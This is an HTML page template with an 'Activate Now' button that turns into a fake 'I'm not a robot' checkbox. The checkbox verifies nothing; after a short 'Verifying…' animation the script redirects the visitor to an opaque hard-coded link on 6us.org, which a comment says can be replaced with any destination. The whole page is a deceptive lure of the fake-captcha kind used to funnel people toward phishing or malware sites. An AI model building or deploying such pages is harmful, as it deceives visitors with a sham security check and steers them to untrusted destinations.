<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Activate Now</title>
  <meta name="description" content="Single button that becomes a captcha, then shows a loading fill and redirects." />
  <style>
    :root{
      --bg:#fff;
      --text:#2d3748;
      --btn:#2563eb;
      --btn-hover:#1d4ed8;
      --btn-fg:#fff;
      --box:#cfd8dc;
      --check:#10b981;
      --bar:#60a5fa;
      --shadow: 0 4px 16px rgba(37,99,235,.07);
    }
    body{
      margin:0;
      background:var(--bg);
      font-family: 'Segoe UI', 'Arial', sans-serif;
      color:var(--text);
    }
    .cta-container{
      display: flex;
      flex-direction: column;
      align-items: center;
      margin:32px auto;
      max-width:360px;
      width:100%;
    }
    button#action{
      position:relative;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      gap:.6rem;
      padding:.85em 1.15em;
      border:0;
      border-radius:24px;
      box-shadow:var(--shadow);
      background:var(--btn);
      color:var(--btn-fg);
      font-weight:700;
      font-size:1rem;
      line-height:1.2;
      cursor:pointer;
      user-select:none;
      transition: background .18s, padding .22s, border-radius .22s, font-size .22s;
      overflow:hidden;
      width:100%;
      max-width:340px;
      min-width:180px;
    }
    button#action:hover{ background:var(--btn-hover) }
    button#action:disabled{ opacity:0.85; cursor:not-allowed }
    #action .label{ position:relative; z-index:2; white-space:nowrap }
    #action .cbox{
      display:none; align-items:center; gap:.55rem; z-index:2;
      color:var(--text);
      font-weight:600;
      white-space:nowrap;
    }
    #action .cbox .box{
      width:1.15em; height:1.15em; border:2px solid var(--box); border-radius:4px;
      background:#fff; display:grid; place-items:center;
    }
    #action .cbox .box .tick{
      width:.7em; height:.7em; border-radius:.15rem; background:transparent;
      transform:scale(0); transition: transform .13s;
    }
    #action .bar{
      position:absolute; left:0; top:0; height:100%; width:0;
      background:var(--bar); opacity:.24; z-index:1; pointer-events:none;
    }
    @keyframes fill3s{ from{ width:0% } to{ width:100% } }
    #action.idle .label{ display:block }
    #action.idle .cbox{ display:none }
    #action.captcha{
      background:#fff; color:var(--text); border-radius:18px; padding:1em 1.1em;
      border: 1px solid var(--box);
    }
    #action.captcha:hover{ background:#fff }
    #action.captcha .label{ display:none }
    #action.captcha .cbox{ display:inline-flex }
    #action.captcha .cbox .box.checked .tick{
      background:var(--check); transform:scale(1);
    }
    #action.loading{
      background:var(--btn); color:var(--btn-fg); border-radius:24px;
    }
    #action.loading .label{ display:block }
    #action.loading .cbox{ display:none }
    #action.loading .bar{ animation: fill3s 3s linear forwards }
    .hint{
      margin-top:.59rem;
      opacity:.79;
      font-size:.92rem;
      text-align:center;
      color: #888;
    }
    @media (max-width:520px){
      .cta-container{ max-width:95vw; }
      button#action{ font-size:0.97rem; min-width:100px; max-width:99vw; }
    }
  </style>
</head>
<body>
  <div class="cta-container">
    <button id="action" class="idle" type="button" aria-live="polite">
      <span class="label">Activate Now</span>
      <span class="cbox" aria-hidden="true">
        <span class="box" id="checkBox"><span class="tick"></span></span>
        <span>I’m not a robot</span>
      </span>
      <span class="bar" aria-hidden="true"></span>
    </button>
    <div class="hint" id="hint" aria-hidden="true"></div>
  </div>
  <script>
    // Replace this URL with your desired destination:
    const DEST_URL = "https://6us.org/?27qX8fFg3NxUDhCju3K2HCDm2h8FXsZiAbTI5VXJkyqV3oXEqhbpW";
    const btn   = document.getElementById('action');
    const hint  = document.getElementById('hint');
    const box   = document.getElementById('checkBox');
    let state = 'idle';
    function toCaptcha(){
      state = 'captcha';
      btn.classList.remove('idle','loading');
      btn.classList.add('captcha');
      hint.textContent = "Click the checkbox to verify.";
      hint.removeAttribute('aria-hidden');
    }
    function toLoading(){
      state = 'loading';
      btn.classList.remove('idle','captcha');
      btn.classList.add('loading');
      btn.disabled = true;
      btn.querySelector('.label').textContent = 'Verifying…';
      hint.textContent = "Please wait ~3 seconds…";
      setTimeout(()=>{ window.location.href = DEST_URL; }, 3000);
    }
    btn.addEventListener('click', (e) => {
      if (state === 'idle') {
        toCaptcha();
        return;
      }
      if (state === 'captcha') {
        box.classList.add('checked');
        toLoading();
      }
    });
    box.addEventListener('click', (e) => {
      e.stopPropagation();
      if (state === 'captcha') {
        box.classList.add('checked');
        toLoading();
      }
    });
    btn.addEventListener('keydown', (e) => {
      if (e.key === ' ' || e.key === 'Enter') {
        e.preventDefault();
        btn.click();
      }
    });
  </script>
</body>
</html>
